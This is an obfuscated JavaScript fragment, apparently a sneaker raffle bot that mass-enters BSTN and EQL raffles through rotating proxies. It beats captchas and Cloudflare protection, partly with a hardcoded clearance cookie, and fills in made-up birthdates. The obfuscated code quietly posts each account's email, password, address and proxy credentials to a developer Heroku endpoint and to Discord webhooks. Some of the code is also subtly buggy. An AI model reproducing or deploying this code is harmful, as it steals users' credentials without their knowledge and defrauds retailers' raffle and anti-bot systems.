                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4b470(_0x2ff504) {
                            const _0x3f1b35 = _0x51338a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1106f7 = _0x2300d9['parse'](_0x3f1b35, { 'header': !![] })['data'];
                            let _0x3a38ef = ![];
                            for (var _0x125226 of _0x1106f7) {
                                if (_0x125226['Url'] == _0x2ff504['Url'] && _0x125226['Email'] == _0x2ff504['Email']) {
                                    _0x3a38ef = !![];
                                    break;
                                }
                            }
                            return _0x3a38ef;
                        }
                        if (await _0x4b470(_0x2d3496[_0x208cfd]) == !![]) {
                            console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x206676 != 'yes')
                            var _0x206676 = '', _0x7412b5 = 0x0;
                        _0x48898b(_0xba1169['name'] + '\x20Task\x20' + (_0x208cfd + 0x1) + '\x20/\x20' + _0x2d3496['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        var _0x53284 = Math['round'](Math['random']() * (_0x405743['length'] - 0x1)), _0x2d765a = _0x405743[_0x53284]['split'](':'), _0x1ec3ea;
                        try {
                            _0x1ec3ea = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2d765a[0x0] + ':' + _0x2d765a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1ec3ea = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2d765a[0x0] + ':' + _0x2d765a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x56a3df = await _0x1ec3ea['newPage'](), _0x3b56fe = await _0x56a3df['target']()['createCDPSession'](), { windowId: _0x1063e1 } = await _0x3b56fe['send']('Browser.getWindowForTarget');
                            await _0x56a3df['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x10674c = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x56a3df['authenticate']({
                                'username': '' + _0x2d765a[0x2],
                                'password': '' + _0x2d765a[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56a3df['goto']('' + _0x2d3496[_0x208cfd]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                await _0x56a3df['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x3b56fe['send']('Browser.setWindowBounds', {
                                'windowId': _0x1063e1,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x468cfd(0x1388), await _0x56a3df['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x56a3df['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x468cfd(0x1f4), console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Logging\x20in'), await _0x56a3df['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x3a3da9 => _0x3a3da9['click']()), await _0x56a3df['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x56a3df['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x468cfd(0x7d0), await _0x56a3df['waitForSelector']('#email-login'), await _0x56a3df['type']('#email-login', '' + _0x2d3496[_0x208cfd]['Email']), await _0x468cfd(0xdac), await _0x56a3df['waitForSelector']('#password'), await _0x56a3df['type']('#password', '' + _0x2d3496[_0x208cfd]['Password'], { 'delay': 0xe6 }), await _0x468cfd(0x157c);
                            try {
                                await _0x56a3df['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x2a9cf1 => _0x2a9cf1['click']());
                            } catch {
                            }
                            try {
                                await _0x56a3df['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0xfd7e0d) {
                            }
                            await _0x468cfd(0x3e8);
                            const _0x7403f9 = await _0x56a3df['$']('.enteredDraw_container__2KmQ_');
                            if (_0x7403f9)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2d3496[_0x208cfd]['Size']);
                            try {
                                if (_0x2d3496[_0x208cfd]['Size'] != 'RANDOM') {
                                    var _0x780041 = _0x2d3496[_0x208cfd]['Size']['replace']('.', ',');
                                    const _0x34625b = await _0x56a3df['$x']('//div[contains(text(),\x20' + _0x780041 + ')]');
                                    await _0x34625b[0x0]['click']();
                                } else {
                                    const _0x4304cb = await _0x56a3df['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4e4ed6 = Math['round'](Math['random']() * (_0x4304cb['length'] - 0x1));
                                    await _0x4304cb[_0x4e4ed6]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x468cfd(0x1f4);
                            const _0x3f3fb4 = await _0x56a3df['$']('.addressList_addressItem__LE2PB');
                            if (_0x3f3fb4 && _0x2d3496[_0x208cfd]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Filling\x20Address'), await _0x56a3df['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x468cfd(0x5dc), await _0x56a3df['waitForSelector']('#firstname'), await _0x56a3df['type']('#firstname', '' + _0x2d3496[_0x208cfd]['FirstName']), await _0x468cfd(0x1f4), await _0x56a3df['waitForSelector']('#firstname'), await _0x56a3df['type']('#lastname', '' + _0x2d3496[_0x208cfd]['LastName']), await _0x468cfd(0x1f4), await _0x56a3df['waitForSelector']('#firstname'), await _0x56a3df['type']('#street', '' + _0x2d3496[_0x208cfd]['Address1']), await _0x468cfd(0x1f4), await _0x56a3df['waitForSelector']('#firstname'), await _0x56a3df['type']('#houseNumber', _0x2d3496[_0x208cfd]['HouseNumber'] + '\x20' + _0x2d3496[_0x208cfd]['Address2']), await _0x468cfd(0x1f4), await _0x56a3df['waitForSelector']('#firstname'), await _0x56a3df['select']('#country_code', '' + _0x2d3496[_0x208cfd]['Country']), await _0x468cfd(0x1f4), await _0x56a3df['type']('#postcode', '' + _0x2d3496[_0x208cfd]['Zip']), await _0x468cfd(0x1f4), await _0x56a3df['type']('#city', '' + _0x2d3496[_0x208cfd]['City']), await _0x468cfd(0x1f4), await _0x56a3df['type']('#telephone', '' + _0x2d3496[_0x208cfd]['Phone']), await _0x468cfd(0x1f4), await _0x56a3df['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x468cfd(0x9c4);
                            try {
                                await _0x56a3df['type']('#instagram_name', '' + _0x2d3496[_0x208cfd]['Follower']), await _0x56a3df['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x468cfd(0x5dc);
                            try {
                                await _0x56a3df['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x468cfd(0x5dc), await _0x56a3df['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3df255 => _0x3df255['click']()), await _0x468cfd(0x1388);
                            try {
                                await _0x56a3df['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x56a3df['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x2d3496[_0x208cfd]['Size'] != 'RANDOM') {
                                    var _0x780041 = _0x2d3496[_0x208cfd]['Size']['replace']('.', ',');
                                    const _0x3c1f4e = await _0x56a3df['$x']('//div[contains(text(),\x20' + _0x780041 + ')]');
                                    await _0x3c1f4e[0x0]['click']();
                                } else {
                                    const _0x3ac8dc = await _0x56a3df['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x4e4ed6 = Math['round'](Math['random']() * (_0x3ac8dc['length'] - 0x1));
                                    await _0x3ac8dc[_0x4e4ed6]['click']();
                                }
                                await _0x468cfd(0x5dc);
                                try {
                                    await _0x56a3df['hover']('#instagram_name'), await _0x56a3df['type']('#instagram_name', '' + _0x2d3496[_0x208cfd]['Follower']), await _0x56a3df['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Retrying\x20(' + _0x7412b5 + '\x20/\x205)');
                                try {
                                    await _0x56a3df['hover']('.checkBox_boxHolder__wLGVe'), await _0x468cfd(0x5dc), await _0x56a3df['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x468cfd(0x157c), await _0x56a3df['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5c9f10 => _0x5c9f10['click']()), await _0x468cfd(0x1388), await _0x56a3df['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x206676 = 'no', _0x504d25(_0x2d3496[_0x208cfd], _0xba1169);
                            try {
                                prxdata = {
                                    'username': _0x50fbd1['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x3b5716),
                                    'proxy': '' + _0x405743[_0x208cfd]
                                };
                                var _0x1ce74d = JSON['stringify'](prxdata);
                                let _0x14f853 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x1ce74d, _0x14f853);
                            } catch (_0x5d8b94) {
                            }
                            console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x3cd64b = await _0x436de5(_0x2d3496[_0x208cfd], _0xba1169, 'dev', ![]), _0x2840c1 = await _0x436de5(_0x2d3496[_0x208cfd], _0xba1169, 'pub', ![]);
                            const _0x4990ef = {
                                'succesDEVMSG': { 'embeds': [_0x3cd64b] },
                                'succesPUBMSG': { 'embeds': [_0x2840c1] }
                            };
                            let _0x3b5716 = _0x2d3496[_0x208cfd];
                            try {
                                prxdata = {
                                    'username': _0x50fbd1['replace']('#', ''),
                                    'module': _0xba1169['name'],
                                    'entrydata': JSON['stringify'](_0x3b5716),
                                    'proxy': '' + _0x405743[_0x208cfd]
                                };
                                var _0x1ce74d = JSON['stringify'](prxdata);
                                let _0x5204a7 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x1ce74d, _0x5204a7);
                            } catch (_0x57b011) {
                            }
                            try {
                                _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x4990ef['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x4990ef['succesDEVMSG']), await _0x468cfd(0xc8), await _0x4feadc(_0x578906, _0x4990ef['succesPUBMSG']);
                            } catch (_0x1b9314) {
                                console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1b9314));
                            }
                        } catch (_0x1663eb) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20' + _0x1663eb)), _0x206676 = 'yes', _0x29025d = '' + _0x1663eb;
                            var _0x437359 = await _0x436de5(_0x2d3496[_0x208cfd], _0xba1169, 'dev', !![], _0x29025d), _0x3cd64b = await _0x436de5(_0x2d3496[_0x208cfd], _0xba1169, 'dev', ![]), _0x2840c1 = await _0x436de5(_0x2d3496[_0x208cfd], _0xba1169, 'pub', ![]);
                            const _0x31843f = {
                                'succesDEVMSG': { 'embeds': [_0x3cd64b] },
                                'succesPUBMSG': { 'embeds': [_0x2840c1] }
                            };
                            _0x31843f['errorDEV'] = { 'embeds': [_0x437359] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x31843f['errorDEV']), await _0x4feadc(_0x408671, _0x31843f['errorDEV']);
                        } finally {
                            _0x1ec3ea['close']();
                            if (_0x206676 == 'yes' && _0x7412b5 != 0x5) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Task\x20' + (_0x208cfd + 0x1) + '\x20:\x20Retrying\x20(' + _0x7412b5 + '\x20/\x205)')), _0x208cfd = _0x208cfd - 0x1, _0x7412b5 = _0x7412b5 + 0x1;
                                continue;
                            }
                            _0x206676 == 'yes' && _0x7412b5 >= 0x5 && (_0x5cd42d(_0x2d3496[_0x208cfd], _0xba1169), _0x206676 = 'no', _0x7412b5 = 0x0), console['log'](_0x2e90f3() + '\x20[' + _0xba1169['name'] + ']\x20Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4eb06e, _0x5b8e53) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x482adf;
                    try {
                        const _0x16fa68 = _0x51338a['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x482adf = _0x2300d9['parse'](_0x16fa68, { 'header': !![] })['data'];
                    } catch (_0x38ee3f) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x4667f0 = 0x0; _0x4667f0 < _0x482adf['length']; _0x4667f0++) {
                        if (_0x3cb233 != 'yes')
                            var _0x3cb233 = '', _0x2cc01e = 0x0;
                        var _0x534838;
                        _0x48898b(_0x4eb06e['name'] + '\x20Task\x20' + (_0x4667f0 + 0x1) + '\x20/\x20' + _0x482adf['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        var _0x552642 = await _0x436de5(_0x482adf[_0x4667f0], _0x4eb06e, 'acc', ![]);
                        const _0x4944cc = { 'succesDEVMSG': { 'embeds': [_0x552642] } }, _0x43380e = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x482168 = Math['round'](Math['random']() * (_0x5b8e53['length'] - 0x1)), _0x39d271 = _0x5b8e53[_0x482168]['split'](':'), _0x412f13;
                        try {
                            _0x412f13 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x39d271[0x0] + ':' + _0x39d271[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x412f13 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x39d271[0x0] + ':' + _0x39d271[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3d0390 = await _0x412f13['newPage']();
                            await _0x3d0390['authenticate']({
                                'username': '' + _0x39d271[0x2],
                                'password': '' + _0x39d271[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x4eb06e['name'] + ']\x20Task\x20' + (_0x4667f0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3d0390['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3d0390['setRequestInterception'](!![]), _0x3d0390['on']('request', _0x31d4f4 => {
                                _0x31d4f4['resourceType']() === 'image' ? _0x31d4f4['abort']() : _0x31d4f4['continue']();
                            });
                            try {
                                await _0x3d0390['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x3d0390['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x3cb233 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x3d0390['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x2e90f3() + '\x20[' + _0x4eb06e['name'] + ']\x20Task\x20' + (_0x4667f0 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x468cfd(0x3e8), await _0x3d0390['type']('#email', _0x482adf[_0x4667f0]['Email']), await _0x468cfd(0x1f4), await _0x3d0390['type']('#pass', _0x482adf[_0x4667f0]['Password']), await _0x468cfd(0x1f4), await _0x3d0390['$eval']('#login-form', _0x460fed => _0x460fed['submit']());
                            try {
                                await _0x3d0390['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x2e90f3() + '\x20[' + _0x4eb06e['name'] + ']\x20Task\x20' + (_0x4667f0 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x468cfd(0x190);
                            const _0x59c132 = await _0x3d0390['evaluate'](() => {
                                const _0x1b6ac2 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x1b6ac2['map'](_0x163f30 => _0x163f30['alt']);
                            }), _0x490fb9 = await _0x3d0390['evaluate'](() => {
                                const _0x15fb46 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x15fb46['map'](_0x4960e6 => _0x4960e6['innerHTML']);
                            }), _0x2ce091 = await _0x3d0390['$$']('.raffle-winner');
                            if (_0x2ce091['length'] < 0x1) {
                                console['log'](_0x2e90f3() + '\x20[' + _0x4eb06e['name'] + ']\x20Task\x20' + (_0x4667f0 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x3cb233 = 'no';
                                continue;
                            }
                            console['log'](_0x2e90f3() + '\x20[' + _0x4eb06e['name'] + ']\x20Task\x20' + (_0x4667f0 + 0x1) + '\x20:\x20' + _0x2ce091['length'] + '\x20Wins\x20Found!');
                            for (var _0x2958f6 = 0x0; _0x2958f6 < _0x2ce091['length']; _0x2958f6++) {
                                console['log'](_0x54c1f9['green'](_0x59c132[_0x2958f6] + _0x490fb9[_0x2958f6]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0xccfa8f) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x4eb06e['name'] + ']\x20Task\x20' + (_0x4667f0 + 0x1) + '\x20:\x20' + _0xccfa8f)), _0x534838 = '' + _0xccfa8f;
                            var _0x14fcc4 = await _0x436de5(_0x482adf[_0x4667f0], _0x4eb06e, 'acc', !![], _0x534838);
                            _0x4944cc['errorDEV'] = { 'embeds': [_0x14fcc4] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x4944cc['errorDEV']), await _0x4feadc(_0x408671, _0x4944cc['errorDEV']), _0x3cb233 = 'yes';
                        } finally {
                            if (_0x412f13)
                                _0x412f13['close']();
                            if (_0x3cb233 == 'yes' && _0x2cc01e != 0x5) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x4eb06e['name'] + ']\x20Task\x20' + (_0x4667f0 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2cc01e + '\x20/\x205)')), _0x4667f0 = _0x4667f0 - 0x1, _0x2cc01e = _0x2cc01e + 0x1;
                                continue;
                            }
                            _0x3cb233 == 'yes' && _0x2cc01e >= 0x5 && (_0x5cd42d(_0x482adf[_0x4667f0], _0x4eb06e), _0x3cb233 = 'no', _0x2cc01e = 0x0), console['log'](_0x2e90f3() + '\x20[' + _0x4eb06e['name'] + ']\x20Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0xaf4879, _0x19f0a7, _0x5ddbae) {
                _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2c28ef['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x234713 = 0x0; _0x234713 < _0x19f0a7['length']; _0x234713++) {
                    var _0x4ec248;
                    _0x48898b(_0xaf4879['name'] + '\x20Task\x20' + (_0x234713 + 0x1) + '\x20/\x20' + _0x19f0a7['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                    try {
                        await _0x16822f(_0x19f0a7, _0x234713);
                    } catch {
                        _0x62a82b = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0xbd3f2f(_0x2deab8) {
                        const _0x405205 = _0x51338a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x560dd1 = _0x2300d9['parse'](_0x405205, { 'header': !![] })['data'];
                        let _0x3a590d = ![];
                        for (var _0x28cf59 of _0x560dd1) {
                            if (_0x28cf59['Url'] == _0x2deab8['Url'] && _0x28cf59['Email'] == _0x2deab8['Email']) {
                                _0x3a590d = !![];
                                break;
                            }
                        }
                        return _0x3a590d;
                    }
                    if (await _0xbd3f2f(_0x19f0a7[_0x234713]) == !![]) {
                        console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x55aa63 = ![];
                    const _0x45156a = _0x51338a['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x4dd65d = _0x2300d9['parse'](_0x45156a, { 'header': !![] })['data'];
                    for (var _0x9e2fe3 of _0x4dd65d) {
                        _0x9e2fe3['Email'] == _0x19f0a7[_0x234713]['Email'] && (_0x55aa63 = !![]);
                    }
                    if (_0x55aa63 == ![]) {
                        var _0xae013f;
                        if (_0x19f0a7[_0x234713]['Url']['endsWith']('/')) {
                            _0xae013f = _0x19f0a7[_0x234713]['Url'] + 'register';
                            if (_0x62a82b != 'yes')
                                var _0x62a82b = '', _0x145d67 = 0x0;
                        } else {
                            _0xae013f = _0x19f0a7[_0x234713]['Url'] + '/register';
                            if (_0x62a82b != 'yes')
                                var _0x62a82b = '', _0x145d67 = 0x0;
                        }
                        if (_0x19f0a7[_0x234713]['Email'] == '' || _0x19f0a7[_0x234713]['FirstName'] == '' || _0x19f0a7[_0x234713]['LastName'] == '') {
                            console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x19f0a7[_0x234713]['Password'] == '' && (_0x19f0a7[_0x234713]['Password'] = 'JRaffles23!');
                        if (_0x2c28ef['useRandomProxy'] = ![])
                            var _0x37e2bb = _0x5ddbae[_0x234713]['split'](':');
                        else
                            var _0x169175 = Math['round'](Math['random']() * (_0x5ddbae['length'] - 0x1)), _0x37e2bb = _0x5ddbae[_0x169175]['split'](':');
                        var _0x11a27e;
                        try {
                            _0x11a27e = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x37e2bb[0x0] + ':' + _0x37e2bb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x11a27e = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x37e2bb[0x0] + ':' + _0x37e2bb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x227281 = await _0x11a27e['newPage']();
                            await _0x227281['authenticate']({
                                'username': '' + _0x37e2bb[0x2],
                                'password': '' + _0x37e2bb[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x227281['setRequestInterception'](!![]), _0x227281['on']('request', _0x53c4ee => {
                                _0x53c4ee['resourceType']() === 'image' || _0x53c4ee['resourceType']() === 'font' || _0x53c4ee['resourceType']() === 'media' ? _0x53c4ee['abort']() : _0x53c4ee['continue']();
                            });
                            try {
                                await _0x227281['goto'](_0xae013f);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x468cfd(0x3e8), await _0x227281['waitForSelector']('#email'), await _0x227281['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x468cfd(0x3e8);
                            try {
                                await _0x227281['click']('li[data-value=\x22EU\x20' + _0x19f0a7[_0x234713]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x19f0a7[_0x234713]['Size']);
                            }
                            await _0x468cfd(0x6a4), await _0x227281['type']('#email', '' + _0x19f0a7[_0x234713]['Email']), await _0x468cfd(0x352), await _0x227281['waitForSelector']('#password'), await _0x227281['type']('#password', '' + _0x19f0a7[_0x234713]['Password']), await _0x468cfd(0x352), await _0x227281['type']('#phone', '' + _0x19f0a7[_0x234713]['Phone']), await _0x468cfd(0x352), await _0x227281['type']('#firstName', '' + _0x19f0a7[_0x234713]['FirstName']), await _0x468cfd(0x352), await _0x227281['type']('#lastName', '' + _0x19f0a7[_0x234713]['LastName']), await _0x468cfd(0x352);
                            _0x19f0a7[_0x234713]['Url']['includes']('footlocker.de') ? await _0x227281['type']('#birthdate', _0x120a07(0x1, 0x1c) + '.' + _0x120a07(0x1, 0xc) + '.' + _0x120a07(0x7c6, 0x7d3)) : await _0x227281['type']('#birthdate', _0x120a07(0x1, 0x1c) + '-' + _0x120a07(0x1, 0xc) + '-' + _0x120a07(0x7c6, 0x7d3));
                            await _0x468cfd(0x352), await _0x227281['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x227281['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x468cfd(0x1f4), await _0x227281['click']('#stateAutocomplete'), console['log'](_0x2e90f3() + '\x20[' + _0xaf4879['name'] + ']\x20Task\x20' + (_0x234713 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x468cfd(0x1f4);
                            try {
                                const _0x880cdd = await _0x227281['$x']('//li[text()=\x22' + _0x19f0a7[_0x234713]['State'] + '\x22]');
                                await _0x880cdd[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
